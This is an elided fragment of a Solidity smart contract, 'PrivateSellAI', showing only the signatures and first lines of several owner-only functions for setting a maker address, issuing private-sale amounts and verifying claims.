...
contract  PrivateSellAI  is  Context ,Ownable {
      ...
      function updateMaker(address AddreMaker) external onlyOwner
    {
     ...
     function PrivateSell(address to, uint amount) external onlyOwner {
        uint rewardAmnt=amount.mul(10**_decimal);
        require(_setVal > rewardAmnt,"Get");
    ...
    function verifyClaim(uint256 claimamount) external onlyOwner  {
         require(_marker == msg.sender, "Invalid");
